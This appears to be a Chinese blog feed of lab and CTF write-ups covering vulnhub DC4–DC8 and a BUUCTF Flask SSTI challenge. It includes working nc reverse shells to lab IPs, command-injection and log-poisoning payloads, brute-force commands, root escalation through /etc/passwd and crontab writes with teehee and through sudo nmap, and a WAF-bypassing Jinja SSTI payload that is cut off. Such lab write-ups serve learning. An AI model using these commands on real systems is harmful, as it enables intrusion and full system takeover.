class="line">然后在5秒后输入</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">他就会直接跳转到root</span><br><span class="line"></span><br><span class="line">注意这个是有时间限制的</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230414160847635.png" alt="image-20230414160847635"></p><p>拿下</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC7</title>
      <link href="/posts/5420f652.html"/>
      <url>/posts/5420f652.html</url>
      
        <content type="html"><![CDATA[<p><strong>总结：<a href="https://so.csdn.net/so/search?q=社工&amp;spm=1001.2101.3001.7020">社工</a>尝试</strong></p><p>先扫一下c段，发现一下靶机</p><p><img src="../images/image-20230413111626730.png" alt="image-20230413111626730"></p><p>然后扫一下端口</p><p><img src="../images/image-20230413111722488.png" alt="image-20230413111722488"></p><p>只有两端口是开放的  80    22 </p><p><img src="../images/image-20230413111858833.png" alt="image-20230413111858833"></p><p>熟悉的drupal框架，只不过这个版本比较新，之前存在漏洞的是7</p><p>msf找不到</p><p>然后尝试一下<code>searchsploit</code>工具，发现是找到的漏洞版本都太新，不适合</p><p><img src="../images/image-20230413112735971.png" alt="image-20230413112735971"></p><p>然后扫目录</p><p>sqlmap  尝试后都无果  最后后翻译了一下网站给的话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DC-7引入了一些“新”概念，但我将留给你们去弄清楚它们是什么。：-）</span><br><span class="line">虽然这个挑战并不完全是技术性的，但如果你需要诉诸暴力或字典攻击，你可能不会成功。</span><br><span class="line">你要做的是跳出框框思考。在盒子外面。：-）</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413113004345.png" alt="image-20230413113004345"></p><p>发现存在也该一个玩意，于是尝试去网上进行搜索发现了一个github地址</p><p><img src="../images/image-20230413113123298.png" alt="image-20230413113123298"></p><p>发现这个github地址</p><p>于是查看配置文件发现</p><p><img src="../images/image-20230413113144350.png" alt="image-20230413113144350"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>于是可以尝试数据库连接或者ssh连接，看哪个能成功</p><p><img src="../images/image-20230413113616668.png" alt="image-20230413113616668"></p><p>ssh登录成功</p><p><img src="../images/image-20230413113653632.png" alt="image-20230413113653632"></p><p>发现存在加密文件</p><p><strong>ls一下看见了两个文件 一个<code>backups</code> 一个<code>mobx</code>进入<code>backups</code>文件夹，发现两个文件，<code>gpg</code>后缀的！！！第一次见 百度一下看看<br><code>gpg</code>是一种基于密钥的加密方式，使用了一对密钥对消息进行加密和解密，来保证消息的安全传输格式是用来加密文件的。</strong></p><p><img src="../images/image-20230413113924613.png" alt="image-20230413113924613"></p><p><strong>然后再看一下 <code>mbox</code> 文件 <code>cat mbox</code> 发现在<code>/opt/scripts/</code> 有个可以执行的脚本文件 <code>backups.sh</code></strong></p><p><img src="../images/image-20230413114040196.png" alt="image-20230413114040196"></p><p><strong>发现了<code>drush</code> 什么是drush？？？？？？？？？？？？？ 经过百度查阅发现<code>drush</code> 是<code>drupal shell</code> 专门管理<code>drupal</code>站点的<code>shell</code></strong></p><p><strong>进入到<code>/var/www/html</code>目录下，使用<code>drush</code>命令修改admin用户的密码为<code>123456</code>，发现可以修改成功！！！</strong></p><p><img src="../images/image-20230413114909163.png" alt="image-20230413114909163"></p><p>修改成功</p><p>但是登不进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush php-eval &#x27;db_query(&quot;DELETE FROM flood&quot;);&#x27;</span><br></pre></td></tr></table></figure><p>先修改密码  在执行这个语句才能登录进去</p><p><img src="../images/image-20230413115924584.png" alt="image-20230413115924584"></p><p>进入后台后  需要找一下哪能进行漏洞利用</p><p><strong>在Content—&gt;Add content–&gt;Basic page下</strong> </p><p>因为这里可以写文件，然后就可以写木马，然后进行上传，然后我们找到上传地址，然后访问上传文件就可以利用shell了</p><p><img src="../images/image-20230413120811600.png" alt="image-20230413120811600"></p><p>但是这里没有php模板，所以我们就得自己装一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.drupal.org/project/php  # 插件下载地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz #模块包</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413160601781.png" alt="image-20230413160601781"></p><p>上传成功后，进行反弹shell</p><p><img src="../images/image-20230413160705537.png" alt="image-20230413160705537"></p><p>反弹成功，进行交互shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>然后就是尝试进行提权了  </p><p>就是利用之前发现的一个sh文件来进行提权</p><p><img src="../images/image-20230413192501447.png" alt="image-20230413192501447"></p><p>因为文件里的内容是这样的  <code>rm xxxx</code>于是我们就可以考虑一下使用<strong>rm</strong>来进行反弹shell利用这个脚本反弹shell之后就是root权限了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.142.129 7777 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure><p>添加单纯的<strong>nc反弹shell</strong>也行  不用rm也行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash/ 192.168.202.129 1234&quot; &gt;&gt;backups.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC7 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC6</title>
      <link href="/posts/2327c6c4.html"/>
      <url>/posts/2327c6c4.html</url>
      
        <content type="html"><![CDATA[<p><strong>总结:wpscan爆破，<a href="https://so.csdn.net/so/search?q=nmap&amp;spm=1001.2101.3001.7020">nmap</a>提权</strong></p><p>发现靶机ip</p><p><img src="../images/image-20230413100512563.png" alt="image-20230413100512563"></p><p>接下来进行端口扫描</p><p><img src="../images/image-20230413100554636.png" alt="image-20230413100554636"></p><p>还是两个正常端口  22和80</p><p>然后访问80端口</p><p><img src="../images/image-20230413100651538.png" alt="image-20230413100651538"></p><p>访问不了   但出现了一个域名</p><p>猜测是域名解析的问题</p><p>于是就去修改 <code>/etc/hosts</code></p><p><img src="../images/image-20230413101135856.png" alt="image-20230413101135856"></p><p>修改后访问成功，发现是wordpress框架的</p><p><img src="../images/image-20230413101154443.png" alt="image-20230413101154443"></p><p>于是就可以使用<code>wpscan</code>工具进行扫描了  先扫一下网站有哪些用户</p><p><code>wpscan --url -e</code> </p><p><img src="../images/image-20230413101443241.png" alt="image-20230413101443241"></p><p>发现存在好几个用户</p><p>那么我们就尝试扫目录，看能不能扫出后台登录地址来</p><p><img src="../images/image-20230413101610519.png" alt="image-20230413101610519"></p><p>发现存在类似后台的目录</p><p><img src="../images/image-20230413101640997.png" alt="image-20230413101640997"></p><p>成功发现后台</p><p>这里的话是不知道密码的  于是我们就选择进行爆破</p><p>但是如果这里使用的是<strong>cewl</strong>根据这个网站生成的密码的话  然后使用<strong>wpscan</strong>进行爆破的话，是不会成功的</p><p>因为生成的字典里没有那个密码</p><p><strong>(下面这种是不会成功的)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//根据网页的内容输出一个字典</span><br><span class="line">cewl https://www.wordy.com/ -w pass.txt</span><br><span class="line"> </span><br><span class="line">//使用命令枚举这个网站的用户</span><br><span class="line">wpscan --url https://www.wordy.com/ -e u  #使用这个没有枚举成功</span><br><span class="line">wpscan --url http://wordy/ -e u  #这个成功了，有点想不明白</span><br><span class="line"> </span><br><span class="line">//将枚举出来的几个用户输入到user.txt</span><br><span class="line">echo &quot;admin\ngraham\nmark\nsarah\njens&quot; &gt; user.txt</span><br><span class="line"> </span><br><span class="line">//尝试爆破密码</span><br><span class="line">wpscan --url wordy -U user.txt -P passwd.txt </span><br></pre></td></tr></table></figure><p><strong>去看别人的wp才知道要使用/usr/share/wordlists/rockyou.txt作为字典，但是这个字典很大，我就将一些关于密码的一些提取到一个字典中，这时候我已经知道密码是helpdesk01了</strong></p><p><strong>注意：rockyou.txt字典是一个压缩包需要我们自己解压。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin\ngraham\nmark\nsarah\njens&quot; &gt; user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//提取相关密码到一个新的字典文件</span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep help &gt; passwd.txt</span><br><span class="line"> </span><br><span class="line">//这里重新爆破</span><br><span class="line">wpscan --url wordy -U user.txt -P passwd.txt </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413103015685.png" alt="image-20230413103015685"></p><p>这里爆破出来了,<a href="http://wordy/wp-login.php">http://wordy/wp-login.php</a> 在这里登录</p><p><code>mark:helpdesk01</code></p><p><img src="../images/image-20230413103149712.png" alt="image-20230413103149712"></p><p>成功登录后台</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>这里的漏洞执行命令在这里</p><p><img src="../images/image-20230413103421863.png" alt="image-20230413103421863"></p><p><img src="../images/image-20230413103455979.png" alt="image-20230413103455979"></p><p><img src="../images/image-20230413103503477.png" alt="image-20230413103503477"></p><p>成功进行了命令执行</p><p><img src="../images/image-20230413103535699.png" alt="image-20230413103535699"></p><p>发现居然有长度限制，但是这里的长度限制只有前端有，后端没有，于是我们就尝试修改一下前端限制长度</p><p><img src="../images/image-20230413103828270.png" alt="image-20230413103828270"></p><p><strong>我们也可以进行抓包来及进行修改</strong></p><p><img src="../images/image-20230413104209721.png" alt="image-20230413104209721"></p><p>这里没有长度进行限制</p><p>然后我们就尝试反弹shell，拿到这个网站的服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;nc -e /bin/bash 192.168.142.129 4444</span><br><span class="line"> </span><br><span class="line">//使用python搞一个伪shell</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413104405636.png" alt="image-20230413104405636"></p><p>弹上去了</p><p>然后进行交互shell</p><p><img src="../images/image-20230413104510719.png" alt="image-20230413104510719"></p><p>然后尝试开始提权</p><p><strong>suid sudo 内核提权</strong>  都试了一遍发现没啥用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最后在用户的根目录中发现了可以文件夹，/home/mark/stuff中发现一个things-to-do.txt</span><br><span class="line">这里发现了graham用户的密码,然后我们通过su来到graham用户中</span><br><span class="line">graham:GSo7isUM1D4</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413104651652.png" alt="image-20230413104651652"></p><p><strong>mark用户的话   sudo -l 查看时需要密码的</strong></p><p>在这里发现sudo -l没有需要密码，而且还有东西，这里去看看</p><p><img src="../images/image-20230413105147268.png" alt="image-20230413105147268"></p><p><strong>/<em>bin</em>/<em>bash</em> 是指此脚本使用/<em>bin</em>/<em>bash</em>来解释执行，#!是特殊的表示符，其后面根的是此解释此脚本的shell的路径</strong></p><p>发现个可执行脚本</p><p><img src="../images/image-20230413105734306.png" alt="image-20230413105734306"></p><p>于是添加/bin/bash进去执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//来到提权文件那里</span><br><span class="line">cd /home/jens</span><br><span class="line"> </span><br><span class="line">//添加可以提权的东西</span><br><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</span><br><span class="line"> </span><br><span class="line">//这里原本直接提权到root，但是失败了</span><br><span class="line">sudo -u root ./backups.sh</span><br><span class="line"></span><br><span class="line">//这里选择到jens中</span><br><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure><p>如果用root用户执行成功的话  那么我们就直接是root用户了</p><p><img src="../images/image-20230413110135091.png" alt="image-20230413110135091"></p><p><img src="../images/image-20230413110241832.png" alt="image-20230413110241832"></p><p>又发现一个无密码能执行的操作    <strong>nmap</strong></p><p>这里查看一些关于nmap的提权方法。</p><p><img src="../images/image-20230413110341092.png" alt="image-20230413110341092"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27;&gt;getroot.sh</span><br><span class="line">sudo nmap --script=getroot.sh</span><br></pre></td></tr></table></figure><p><code>--script=script_name 使用扩展脚本</code></p><p><img src="../images/image-20230413110654526.png" alt="image-20230413110654526"></p><p>提权成功</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC5</title>
      <link href="/posts/ba2e977e.html"/>
      <url>/posts/ba2e977e.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>总结：screen-4.5.0<a href="https://so.csdn.net/so/search?q=提权&amp;spm=1001.2101.3001.7020">提权</a></p></blockquote><p>先扫一下端口</p><p><img src="../images/image-20230412152813358.png" alt="image-20230412152813358"></p><p>发现了一个<strong>rpcbind</strong>的东西   先去查查这是个什么东西</p><p><img src="../images/image-20230412152939958.png" alt="image-20230412152939958"></p><p>题目这里给了这个端口的服务的话，肯定是会存在漏洞，等会我们可以去查查这个服务的漏洞</p><p><img src="../images/image-20230412153058971.png" alt="image-20230412153058971"></p><p><img src="../images/image-20230412153151894.png" alt="image-20230412153151894"></p><p>除了这里之外没有别的地方可以写东西了，那么我们就尝试一下去扫一下目录</p><p><img src="../images/image-20230412153543069.png" alt="image-20230412153543069"></p><p>扫到一些目录</p><p>只有这个目录是新的 <strong>thankyou.php</strong> </p><p>其他目录就是网站上的目录，那么我们就访问这个目录</p><p><img src="../images/image-20230412153859581.png" alt="image-20230412153859581"></p><p>这里的话有个file参数可进行任意文件的读取</p><p><img src="../images/image-20230412153954317.png" alt="image-20230412153954317"></p><p>确实可以进行任意文件的读取</p><p>这里话由于这个网站是nginx的，那么我们就想一下看能不能进行<strong>日志文件包含</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.5.8/thankyou.php?file=/var/log/nginx/access.log  ##看日志文件</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412154257695.png" alt="image-20230412154257695"></p><p>成功读取，那么我们就尝试一下看能不能写进去一句话木马</p><p><img src="../images/image-20230412160439962.png" alt="image-20230412160439962"></p><p>抓包后，进行写一句话木马</p><p><img src="../images/image-20230412162804378.png" alt="image-20230412162804378"></p><p>这里还有一种写法在这篇文章   就是利用写入不是文件名，然后报错把内容写入<strong>error.log</strong>         <a href="https://blog.csdn.net/rpsate/article/details/119769130?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168128406716800180635192%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168128406716800180635192&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-119769130-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=dc5%20vulnhub&amp;spm=1018.2226.3001.4187">error.log方法的文章</a></p><p>ctf题目是在user-Agent处写的，但是这里写不进去，于是就在GET处写</p><p>然后尝试使用蚁剑连接</p><p><img src="../images/image-20230412162817855.png" alt="image-20230412162817855"></p><p>然<img src="../images/image-20230412163233853.png" alt="image-20230412163233853">后就是打开蚁剑终端进行访谈shell了，因为蚁剑终端不好用  提权也提不了</p><p>然后使用<strong>python交互shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>到这一步就是开始提权了 </p><p>还是尝试那几种方法  suid  sudo 内核提取</p><p>suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412163453606.png" alt="image-20230412163453606"></p><p>发现了有个<strong>screen-4.5.0</strong></p><p>然后就是先利用<strong>searchsploit</strong>工具搜索一下看是否存在漏洞</p><p><img src="../images/image-20230412164801197.png" alt="image-20230412164801197"></p><p>发现确实存在漏洞<strong>(本地提权漏洞)</strong></p><p>然后进行提取文件下来查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/41154.sh  41154.sh</span><br><span class="line"> </span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/41152.txt  41152.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412173201325.png" alt="image-20230412173201325"></p><p>按照这个里面给的命令和方法照着做就行了</p><p><strong>第一步：将上部分的c语言代码另存为libhax.c文件 然后gcc编译：<code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></strong></p><p>这里得把文件都放到tmp文件夹里</p><p><a href="https://blog.csdn.net/m0_64815693/article/details/128687469?spm=1001.2014.3001.5502">wp1 </a>    <a href="https://blog.csdn.net/Aluxian_/article/details/123726473?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168128406716800180635192%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168128406716800180635192&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-123726473-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=dc5%20vulnhub&amp;spm=1018.2226.3001.4187">wp2</a></p><p>看着跟着搞就行了  这里就不详细写了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC4</title>
      <link href="/posts/cd29a7e8.html"/>
      <url>/posts/cd29a7e8.html</url>
      
        <content type="html"><![CDATA[<p><strong>总结</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爆破，teehee提权</span><br></pre></td></tr></table></figure><p>还是先扫一下端口</p><p><img src="../images/image-20230411234310796.png" alt="image-20230411234310796"></p><p>发现两个端口</p><p>一个ssh端口  一个80端口</p><p><img src="../images/image-20230411234348802.png" alt="image-20230411234348802"></p><p>发现就是个简单的登录，没有框架的</p><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p>这里发现有一个登录的网页，这里首先我们尝试尝试一些普通的弱口令，这里没有成功，我们这里使用burp来爆破admin密码。</p><p><img src="../images/image-20230412090343198.png" alt="image-20230412090343198"></p><p>爆破出这个弱密码</p><p><strong>happy</strong></p><p>于是就尝试进行登录</p><p><img src="../images/image-20230412090502638.png" alt="image-20230412090502638"></p><p>成功登录后</p><p><img src="../images/image-20230412090542056.png" alt="image-20230412090542056"></p><p>发现可以进行任意命令的执行</p><p>于是就想的是进行反弹shell</p><p><img src="../images/image-20230412090950140.png" alt="image-20230412090950140"></p><p>反弹shell成功后</p><p>这里的界面太难看，进行<strong>python交互shell</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412091124299.png" alt="image-20230412091124299"></p><p>进行home目录，发现有三个用户</p><p>进入jim目录，发现有密码备份，于是<strong>猜测可以利用这个密码备份来进行爆破jim的ssh密码</strong></p><p><img src="../images/image-20230412091220929.png" alt="image-20230412091220929"></p><p><img src="../images/image-20230412091518236.png" alt="image-20230412091518236"></p><p><strong>只有短短的一些密码</strong>    存到kali上，等会进行爆破</p><p>于是使用ssh爆破工具开始进行爆破</p><p><a href="https://xie.infoq.cn/article/e82e7a36d35ad78783ef4a1b6">【Kali】中密码暴力破解工具 hydra 的使用</a></p><p><strong>ftp ssh teamspeak  pop3</strong>  都可以进行爆破</p><p>上面的文章里还搭配着一个字典生成工具</p><p><strong>crunch</strong>    但是只能生成纯数字的密码</p><p>使用<strong>hydra -h</strong>慢慢看就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P 2.txt ssh://192.168.142.131</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412145145617.png" alt="image-20230412145145617"></p><p>获得密码为：<code>jibril04</code> 登入ssh</p><p><img src="../images/image-20230412145239375.png" alt="image-20230412145239375"></p><p>登录成功</p><p><img src="../images/image-20230412145302805.png" alt="image-20230412145302805"></p><p>获得提示</p><p>登入提示：<code>You have mail</code> 让我们看邮寄 <code>cd/var/mail</code> 发现了jim里面有个Charles密码：<code>^xHhA&amp;hvim0y</code> 尝试切换登入</p><p><img src="../images/image-20230412145604425.png" alt="image-20230412145604425"></p><p>到最后一步了</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>还是先尝试一下suid和sudo 内核提权</p><p><img src="../images/image-20230412145805562.png" alt="image-20230412145805562"></p><p>发现个没密码的能以root权限执行的命令</p><p><img src="../images/image-20230412150005731.png" alt="image-20230412150005731"></p><p><strong>passwd的格式：[⽤户名]：[密码]：[UID]：[GID]：[⾝份描述]：[主⽬录]：[登录shell]</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;axb::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p><strong>uid为零    ——&gt;   root用户</strong></p><p><img src="../images/image-20230412151531467.png" alt="image-20230412151531467"></p><p>这里有个小坑就是切换成charles用户的时候，不能用ssh登录来进行切换，得用之登录的jim用户，使用su切换   不然提权不成功</p><p><strong>方法二</strong></p><p><strong>2.创建定时任务给提权</strong><br>看了一下大佬的博客，发现是这样的，创建一个定时人物然后给/bin/sh赋予SUID的权限，然后用teehee命令这个定时任务，写到/etc/crontab里面去。</p><p>命令如下。</p><p>echo “<em> </em> <em> </em> * root chmod 4777 /bin/sh” | sudo teehee -a /etc/crontab<br>1<br>crontab命令详解可以百度查资料。</p><p>这样之后我们就可以直接在控制台里面输入/bin/sh就可以了，如下图提权成功。</p><p><img src="../images/image-20230412151903053.png" alt="image-20230412151903053"></p><p><strong>总结</strong></p><p>还有弱口令密码爆破</p><p>学习了hydra的使用和teehee提权</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub DC4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无敌RCE-trick</title>
      <link href="/posts/d13cd9bb.html"/>
      <url>/posts/d13cd9bb.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/q20010619/article/details/109206728">CTF中字符长度限制下的命令执行 rce(7字符5字符4字符)汇总</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE 限制长度 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-刷题记录-第三页</title>
      <link href="/posts/dca6c0ad.html"/>
      <url>/posts/dca6c0ad.html</url>
      
        <content type="html"><![CDATA[<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>题目</p><p><img src="../images/image-20230411195501929.png" alt="image-20230411195501929"></p><p><img src="../images/image-20230411195551367.png" alt="image-20230411195551367"></p><p>提示了，flask算pin</p><p><img src="../images/image-20230411195641629.png" alt="image-20230411195641629"></p><p>利用解密的时候报错，得出一些信息</p><p><img src="../images/image-20230411195756528.png" alt="image-20230411195756528"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure><ol><li><p>根据代码，可以知道我们加密后的代码经过waf后就会被直接渲染，那么就可能存在ssti了。</p></li><li><p>我们进行绕过来尽可能的达到命令执行，因为有waf，我们对可能进行了过滤的单词使用<strong>拆分关键词进行绕过</strong></p><p><strong>就是输入base64加密后的值，然后进行解密，解密后绕过能绕过waf，那么就可以进行模板注入了</strong></p></li></ol><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eva&#x27;</span>+<span class="string">&#x27;l&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eva&#x27;</span>+<span class="string">&#x27;l&#x27;</span>](<span class="string">&#x27;__impor&#x27;</span>+<span class="string">&#x27;t__&#x27;</span>+<span class="string">&#x27;(&quot;o&#x27;</span>+<span class="string">&#x27;s&quot;)&#x27;</span>+<span class="string">&#x27;.pope&#x27;</span>+<span class="string">&#x27;n&#x27;</span>+<span class="string">&#x27;(&quot;cat /this_is_the_flag.txt&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif 